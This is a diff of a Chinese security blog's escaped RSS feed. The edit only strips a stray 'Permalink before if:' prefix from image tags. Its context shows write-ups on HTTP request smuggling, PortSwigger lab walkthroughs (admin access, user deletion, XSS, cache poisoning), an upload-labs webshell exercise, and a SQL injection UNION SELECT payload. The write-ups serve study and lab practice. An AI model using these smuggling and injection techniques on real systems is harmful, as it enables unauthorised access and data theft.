 >&lt;/p>
 &lt;p>一般来说，反向代理与后端服务器不会使用 pipeline 技术，甚至也不会去使用 Keep-Alive ，更多时候反向代理采取的措施是重用 TCP 链接，因为对于反向代理与后端服务器来说，反向代理服务器与后端服务器 IP 相对固定，不同用户的请求通过代理服务器与后端服务器建立链接，将这两者之间的 TCP 链接进行重用，也就顺理成章了。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191130132520.png&lt;img src="https://blogpic.zdy.one/img/20191130132520.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191130132520.png"
 loading="lazy"
 >&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191130132258.png&lt;img src="https://blogpic.zdy.one/img/20191130132258.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191130132258.png"
 loading="lazy"
 >&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191130132605.png&lt;img src="https://blogpic.zdy.one/img/20191130132605.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191130132605.png"
 loading="lazy"
 >&lt;/p>
 &lt;blockquote>
@@ -8479,22 +8417,22 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>并且 HTTP/0.9 请求包与响应包是都没有 headers 的概念的，也就是说如下：&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191130142331.png&lt;img src="https://blogpic.zdy.one/img/20191130142331.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191130142331.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>因为 HTTP/0.9 响应包没有 headers 的特性，在 HTTP Smuggling 中利用起来也就特别的有意思了。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191130143300.png&lt;img src="https://blogpic.zdy.one/img/20191130143300.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191130143300.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>这张图的意思就是我们在 HTTP Smuggling 的时候使用 HTTP/0.9 进行 Smuggle ，这并不是 HTTP/0.9 标准的格式，但是由于一些中间件已经不支持直接解析 HTTP/0.9 的标准格式了，但是还可能存在解析这种指定 HTTP version 的情况。于是就可能存在以下这种情况：&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191130143557.png&lt;img src="https://blogpic.zdy.one/img/20191130143557.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191130143557.png"
 loading="lazy"
 >&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191130143626.png&lt;img src="https://blogpic.zdy.one/img/20191130143626.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191130143626.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>上面两个图展现了一个大致的攻击流程，chewy2.jpg 当中的 24-33664 字节有着一个完整的 HTTP 响应报文，当 Golang 在处理 HTTP/0.9 的时候，由于我们指定了&lt;code>Range: bytes=24-33664&lt;/code>，就是我们可以指定获取响应报文的 24-33664 个字节，也就是获取了我们存放在图片当中的 HTTP 报文，然后返回给 Golang ，Golang 对于 HTTP/0.9 再进行标准化去头的处理，这样响应看起来就是一个新的响应了。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191130153851.png&lt;img src="https://blogpic.zdy.one/img/20191130153851.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191130153851.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>当一个正常用户去请求的时候，如果 Apache 重新使用了 TCP/IP 链接，就会将我们构造在图片当中的 HTTP 报文当作响应包返回给用户。这也是一个很典型的 HTTP Response Splitting 的思路。具体可以看看视频演示 &lt;a class="link" href="https://www.youtube.com/watch?v=lY_Mf2Fv7kI" target="_blank" rel="noopener"
@@ -8660,7 +8598,7 @@ the origination timestamp for the message in which it appears.&lt;/p>
 &lt;/div>
 &lt;/div>&lt;p>其他的代码我们并不需要过多了解，这里我们可以知道这里将空格与&lt;code>:&lt;/code>冒号同样处理了，也就是如果存在空格会把&lt;code>:&lt;/code>其之前的 field name 正常处理，并不会抛出错误或者进行其他操作。这样就与 RFC 标准的规范不一致了，于是就会产生解析差异。&lt;/p>
 &lt;p>@Bi3g0 构建了比较清晰的漏洞原理图：&lt;/p>
-&lt;p>Permalink before if: https://user-images.githubusercontent.com/18691823/65211134-3e03cd00-dad0-11e9-94a5-b9f04ea18f38.png&lt;img src="https://user-images.githubusercontent.com/18691823/65211134-3e03cd00-dad0-11e9-94a5-b9f04ea18f38.png"
+&lt;p>&lt;img src="https://user-images.githubusercontent.com/18691823/65211134-3e03cd00-dad0-11e9-94a5-b9f04ea18f38.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里用的例子是采用 ELB 作为 Front 服务器，Netty 作为 Backend 服务器进行举例，我们发送如下请求：&lt;/p>
@@ -8729,7 +8667,7 @@ loading="lazy"
 &lt;/h3>&lt;p>接下来几个攻击方式我们可以通过 @portswigger 提供的几个 Lab 给我们进行练习以加深理解——&lt;a class="link" href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener"
 >HTTP request smuggling&lt;/a>&lt;/p>
 &lt;p>在做之前记得要把 BurpSuite 的自动更新 Content-Length 功能取消了。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191013185654.jpg&lt;img src="https://blogpic.zdy.one/img/20191013185654.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191013185654.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>首先我们来看 CL-TE 的情况：&lt;a class="link" href="https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te" target="_blank" rel="noopener"
@@ -8764,10 +8702,10 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>根据题目的提示要求，这里我们发送两次以上 HTTP 请求包：&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191013190441.jpg&lt;img src="https://blogpic.zdy.one/img/20191013190441.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191013190441.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191013190452.jpg&lt;img src="https://blogpic.zdy.one/img/20191013190452.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191013190452.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>我们就可以使第二次请求构造出 GPOST 的 HTTP Method 了，详细的我们可以按照下面这个流程图来看看：&lt;/p>
@@ -8892,7 +8830,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>根据题目的提示要求，这里我们发送两次以上 HTTP 请求包即可，我们可以收到如下图所示的响应。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191122230209.png&lt;img src="https://blogpic.zdy.one/img/20191122230209.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191122230209.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>过程流程与 CL-TE 类似，Front 服务器处理这个请求的时候按照 TE 优先处理，会认为上面的请求为一个请求整体，然后转发给 Backend 服务器，Backend 服务器在处理的时候按照 CL 优先处理，会认为&lt;code>12\r\n&lt;/code>为第一个请求的 body ，以下为第二个请求，所以会响应 GPOST 为无法识别的 HTTP Method。&lt;/p>
@@ -8956,7 +8894,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>我们就可以得到如下图的响应：&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191123002425.png&lt;img src="https://blogpic.zdy.one/img/20191123002425.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191123002425.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>我们可以看到这里是用了两个 TE 字段，并且第二个 TE 字段值非标准值，这里 Front 选择对第一个 TE 进行优先处理，整个请求则为正常请求，会转发给 Backend 服务器，而 Backend 服务器以第二个 TE 进行优先处理，而第二个 TE 值非正常，则会取 CL 字段进行处理，这样这个请求就会因为 CL 字段设置的值 4 而被拆分为两个请求。&lt;/p>
@@ -9056,10 +8994,10 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>得到的响应如下两图&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191123154656.png&lt;img src="https://blogpic.zdy.one/img/20191123154656.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191123154656.png"
 loading="lazy"
 >&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191123154609.png&lt;img src="https://blogpic.zdy.one/img/20191123154609.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191123154609.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>可以看到第二个请求我们得到了&lt;code>/admin&lt;/code>的响应&lt;/p>
@@ -9113,7 +9051,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>我们可以看到成功访问到了&lt;code>/admin&lt;/code>面板内容，如果不成功可以多发送几次试试看&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191123155053.png&lt;img src="https://blogpic.zdy.one/img/20191123155053.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191123155053.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>得到了删除的 api ，于是我们再利用 HTTP Smuggling 访问这个 &lt;code>/admin/delete?username=carlos&lt;/code> 即可，构造如下数据包：&lt;/p>
@@ -9153,7 +9091,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="g">Host: localhost
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191123155603.png&lt;img src="https://blogpic.zdy.one/img/20191123155603.png"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191123155603.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>这种攻击方式类似 HTTP SSRF ，主要的点就是在控制 CL 数值上，比如说第一个数据包 CL 的值为 28 ，是这么计算的：&lt;/p>
@@ -9196,23 +9134,23 @@ loading="lazy"
 &lt;p>To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos.&lt;/p>
 &lt;/blockquote>
 &lt;p>这里根据题目提示，场景是一个 CL-TE 的场景，并且给出一个搜索框，我们尝试随便搜索一个 123 ，可以发现搜索结果“123”直接回显到了相应当中。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191124191719.png&lt;img src="https://blogpic.zdy.one/img/20191124191719.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191124191719.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>尝试使用 HTTP Smuggling 方式访问，但是被 blocked ：&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191124203138.png&lt;img src="https://blogpic.zdy.one/img/20191124203138.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191124203138.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>然后我们可以尝试利用搜索回显把 Front 服务器转发的请求头给泄露出来：&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191124202357.png&lt;img src="https://blogpic.zdy.one/img/20191124202357.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191124202357.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>如果后面只是添加那个 X-*-Ip 的请求头是访问不了 admin 面板的，因为这样会让 Backend 收到两个重复的请求头，在这个场景当中，Backend 服务器对重复的请求头做出了判断：&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191124204018.png&lt;img src="https://blogpic.zdy.one/img/20191124204018.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191124204018.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>所以我们需要把 Front 服务器添加的请求头给“隐藏”掉，我们就可以利用 Smuggling 通过 body 的方式把其他 Front 服务器添加的请求头“隐藏”掉，然后我们就可以得到 admin 面板回显：&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191124203108.png&lt;img src="https://blogpic.zdy.one/img/20191124203108.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191124203108.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>整个流程看起来比较简单，但是仔细做的话，其实 CL 的值比较关键，我们来看看泄露 Front 请求的那个数据包的 CL 值怎么算的：&lt;/p>
@@ -9297,7 +9235,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>只要下面这个 CL 足够大，我们就可以用 HTTP Smuggling 把下一个用户的请求拼接到我们最后一个 comment 参数里面了，然后我们在看评论处就可以看到别人的请求头了。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191124213544.png&lt;img src="https://blogpic.zdy.one/img/20191124213544.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191124213544.png"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="exploit-reflected-xss">Exploit Reflected XSS
@@ -9309,7 +9247,7 @@ loading="lazy"
 &lt;p>To solve the lab, smuggle a request to the back-end server that causes the next user&amp;rsquo;s request to receive a response containing an XSS exploit that executes alert(1).&lt;/p>
 &lt;/blockquote>
 &lt;p>还是依旧的 CL-TE 场景，我们可以在 UA 处发现有一个反射 XSS，but 单是这样没什么用，所以我们得想点办法升级危害。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191124235543.png&lt;img src="https://blogpic.zdy.one/img/20191124235543.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191124235543.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>我们可以构造以下数据包，只要发送一次&lt;/p>
@@ -9360,10 +9298,10 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>然后我们随便访问该站任何页面都会被弹窗了，因为我们的请求被嵌入到了上面的第二个请求当中：&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191125000410.png&lt;img src="https://blogpic.zdy.one/img/20191125000410.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191125000410.png"
 loading="lazy"
 >&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191125001149.png&lt;img src="https://blogpic.zdy.one/img/20191125001149.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191125001149.png"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="turn-an-on-site-redirect-into-an-open-redirect">Turn An On-Site Redirect Into An Open Redirect
@@ -9453,7 +9391,7 @@ loading="lazy"
 &lt;/blockquote>
 &lt;p>这个环境也是一个可以修改 Host 进行跳转的场景，而在&lt;code>/post/next?postId=2&lt;/code>路由正好有一个跳转的 api 供我们使用，这个路由跳转到的是&lt;code>/post?postId=4&lt;/code>。&lt;/p>
 &lt;p>根据题目描述，我们需要实现缓存投毒， 例如这里我们就选择&lt;code>/resources/js/tracking.js&lt;/code>进行投毒，LAB 还给了我们制造投毒的服务，于是我们可以进行以下设置：&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191129014911.png&lt;img src="https://blogpic.zdy.one/img/20191129014911.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191129014911.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>发送以下数据包一次：&lt;/p>
@@ -9508,11 +9446,11 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>然后访问&lt;code>/resources/js/tracking.js&lt;/code>:&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191129015245.png&lt;img src="https://blogpic.zdy.one/img/20191129015245.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191129015245.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>我们可以看到响应包的跳转地址被我们修改成了我们 exploit 的服务器地址，然后我们访问正常服务器主页试试：&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191129015530.png&lt;img src="https://blogpic.zdy.one/img/20191129015530.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191129015530.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>可以看到成功&lt;code>alert(1)&lt;/code>。&lt;/p>
@@ -9651,15 +9589,15 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>但是 Paypal 登录页面有 CSP 规则 &lt;code>script-src&lt;/code> 限制了这个跳转。&lt;/p>
-&lt;p>Permalink before if: https://portswigger.net/cms/images/e1/5c/43ccf8d84ffc-article-paypal-01.svg&lt;img src="https://portswigger.net/cms/images/e1/5c/43ccf8d84ffc-article-paypal-01.svg"
+&lt;p>&lt;img src="https://portswigger.net/cms/images/e1/5c/43ccf8d84ffc-article-paypal-01.svg"
 loading="lazy"
 >&lt;/p>
 &lt;p>后来作者发现该页面还有一个动态生成的 iframe 引入了 c.paypal.com ，且该子页面没有 CSP 而且还引入了作者投毒的 js 文件！虽然这样可以控制 iframe 页面，但是由于同源策略，是读不到父页面的数据的。&lt;/p>
-&lt;p>Permalink before if: https://portswigger.net/cms/images/1e/65/8e618cf695b8-article-paypal-02.svg&lt;img src="https://portswigger.net/cms/images/1e/65/8e618cf695b8-article-paypal-02.svg"
+&lt;p>&lt;img src="https://portswigger.net/cms/images/1e/65/8e618cf695b8-article-paypal-02.svg"
 loading="lazy"
 >&lt;/p>
 &lt;p>再接着作者的同事在 paypal.com/us/gifts 发现了一个不使用 CSP 的页面，并且也导入了作者投毒的 js 文件，这样作者终于通过 js 将 c.paypal.com 的 iframe 重定向到了 paypal.com/us/gifts ，这样就同源了，也就可以读取父页面的数据了。&lt;/p>
-&lt;p>Permalink before if: https://portswigger.net/cms/images/13/0e/7fcaae230c37-article-paypal-03.svg&lt;img src="https://portswigger.net/cms/images/13/0e/7fcaae230c37-article-paypal-03.svg"
+&lt;p>&lt;img src="https://portswigger.net/cms/images/13/0e/7fcaae230c37-article-paypal-03.svg"
 loading="lazy"
 >&lt;/p>
 &lt;p>Paypal 第一次修复是将 Akamai 配置修改成拒绝含有 Transfer-Encoding: chunked 的请求，但是后来又被作者构造了一个换行的 header 绕过了：&lt;/p>
@@ -10154,7 +10092,7 @@ loading="lazy"
 >caddy&lt;/a> 上（现在是 11月 27 日，竟然出 caddy 2 了&amp;hellip;），然后拿他进行了实验，由于自己比较懒用了 docker hub 上的环境 &lt;a class="link" href="https://hub.docker.com/r/abiosoft/caddy" target="_blank" rel="noopener"
 >caddy&lt;/a>。&lt;/p>
 &lt;p>于是就有了：&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191129022617.png&lt;img src="https://blogpic.zdy.one/img/20191129022617.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191129022617.png"
 loading="lazy"
 >&lt;/p>
 &lt;p>当时找到挺开心的，以为一个 CVE 就这么简单的到手了，因为 Netty CVE 给的启示嘛，这也算是一个解析差异。然后当时我跟导师还仔细深入探究了这个产生的原因，跟了一下代码，发现可能是 Go 某个原生库的原因，我本地也单独抽了其中有问题的代码测了一遍，确认就是那个库的原因。&lt;/p>
@@ -10187,7 +10125,7 @@ loading="lazy"
 &lt;p>之后我去查询了一下 HTTP/2 与 HTTP/1.1 的差异，个人认为主要是 HTTP/2 中加入了 Request multiplexing over a single TCP connection ，也就是说使用 HTTP/2 可以使用单个 TCP 连接来进行请求资源，也就减少了 TCP 连接复用的可能性，即使能 Smuggle 也只能打自己；而且对于新的二进制分帧机制引入也对该种攻击做出了限制。&lt;/p>
 &lt;p>具体可以参考 &lt;a class="link" href="https://developers.google.com/web/fundamentals/performance/http2#%E6%AF%8F%E4%B8%AA%E6%9D%A5%E6%BA%90%E4%B8%80%E4%B8%AA%E8%BF%9E%E6%8E%A5" target="_blank" rel="noopener"
 >HTTP/2 简介&lt;/a>&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20191205225455.png&lt;img src="https://blogpic.zdy.one/img/20191205225455.png"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20191205225455.png"
 loading="lazy"
 >&lt;/p>
 &lt;h1 id="bonus">Bonus
@@ -10653,7 +10591,7 @@ In computer security, a vulnerability is a weakness which can be exploited by a 
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这样只要一次访问成功该 php 文件，即可拿到 shell&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610008080.jpg&lt;img src="https://blogpic.zdy.one/img/20190610008080.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008080.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="pass-18">Pass-18
@@ -10893,12 +10831,12 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>这里需要注意的是，&lt;code>save_name[0]&lt;/code>放&lt;code>jpg&lt;/code>就好了，否则&lt;code>$ext&lt;/code>拿到的是&lt;code>upload-20.jpg&lt;/code>，这样整个字符串就会进入&lt;code>!in_array($ext, $allow_suffix)&lt;/code>这个判断里面了。&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610006384.jpg&lt;img src="https://blogpic.zdy.one/img/20190610006384.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610006384.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h2 id="conclusion">Conclusion
 &lt;/h2>&lt;p>这个靶场还是挺好的，总结得都相当不错。如果能配合更多的中间件解析漏洞来做的话会更棒，因为很多时候我们做到的仅仅是上传一个 jpg 啥的，如果配合解析漏洞或者文件包含，可以进一步扩大杀伤力。&lt;/p>
-&lt;p>Permalink before if: https://raw.githubusercontent.com/c0ny1/upload-labs/master/doc/mind-map.png&lt;img src="https://raw.githubusercontent.com/c0ny1/upload-labs/master/doc/mind-map.png"
+&lt;p>&lt;img src="https://raw.githubusercontent.com/c0ny1/upload-labs/master/doc/mind-map.png"
 loading="lazy"
 >&lt;/p></description></item><item><title>面试经验分享</title><link>https://zeddyu.github.io/p/%E9%9D%A2%E8%AF%95%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/</link><pubDate>Thu, 14 Mar 2019 21:46:19 +0000</pubDate><guid>https://zeddyu.github.io/p/%E9%9D%A2%E8%AF%95%E7%BB%8F%E9%AA%8C%E5%88%86%E4%BA%AB/</guid><description>&lt;p>这篇写一下最近的笔试面试经验&lt;/p>
 &lt;p>最近投了360、腾讯、阿里、华为，全都是安全技术岗。&lt;/p>
@@ -11825,7 +11763,7 @@ loading="lazy"
 &lt;h4 id="http-header">HTTP Header
 &lt;/h4>&lt;p>通过 Meta 的方式很是简单，但当涉及到的页面较多时，使用 Meta 标签的方式需要在每个页面都各自加上。而如果通过服务端配置 HTML 返回的响应头 HTTP header 带上 CSP 的指令的话，那将能够一劳永逸，同时支持多个页面。下图为响应头&lt;/p>
 &lt;p>&lt;a class="link" href="https://cloud.githubusercontent.com/assets/10385585/15383445/cc0bb89a-1dc5-11e6-9fa8-8854ae6b1a1d.png" target="_blank" rel="noopener"
->Permalink before if: https://cloud.githubusercontent.com/assets/10385585/15383445/cc0bb89a-1dc5-11e6-9fa8-8854ae6b1a1d.png&lt;img src="https://cloud.githubusercontent.com/assets/10385585/15383445/cc0bb89a-1dc5-11e6-9fa8-8854ae6b1a1d.png"
+>&lt;img src="https://cloud.githubusercontent.com/assets/10385585/15383445/cc0bb89a-1dc5-11e6-9fa8-8854ae6b1a1d.png"
 loading="lazy"
 alt="http"
 >&lt;/a>&lt;/p>
@@ -12112,7 +12050,7 @@ alt="http"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>当前目录下随便放置一个文件提供引入即可，然后我们可以发现&lt;code>iframe&lt;/code>当中其实就是个 html 页面&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610009928.jpg&lt;img src="https://blogpic.zdy.one/img/20190610009928.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009928.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>然后我们尝试对其进行修改&lt;/p>
@@ -12124,7 +12062,7 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-javascript" data-lang="javascript">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">window&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">frames&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="nb">document&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">head&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">innerHTML&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;hasaki!&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610003468.jpg&lt;img src="https://blogpic.zdy.one/img/20190610003468.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003468.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>我们就可以在&lt;code>iframe&lt;/code>的页面中发现&lt;code>&amp;lt;head&amp;gt;&lt;/code>标签内容已经被我们改成了&lt;code>hasaki!&lt;/code>&lt;/p>
@@ -12191,7 +12129,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>可以发现执行了 javascript 代码&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610004313.jpg&lt;img src="https://blogpic.zdy.one/img/20190610004313.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004313.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="example-2">Example 2
@@ -13206,7 +13144,7 @@ be decoded either&lt;/p>
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="n">id&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="n">d1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">union&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="k">schema_name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">information_schema&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">schemata&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">limit&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">15&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">23&lt;/span>&lt;span class="w">
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610001927.jpg&lt;img src="https://blogpic.zdy.one/img/20190610001927.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610001927.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;div class="highlight">&lt;div class="chroma">
@@ -13418,7 +13356,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>虽然页面不会直接回显，但是点击 id 的超链接过去就可以看到了&lt;/p>
-&lt;p>Permalink before if: https://blogpic.zdy.one/img/20190610002723.jpg&lt;img src="https://blogpic.zdy.one/img/20190610002723.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610002723.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="example-9">Example 9
@@ -13502,7 +13440,7 @@ loading="lazy"
 &lt;/blockquote>
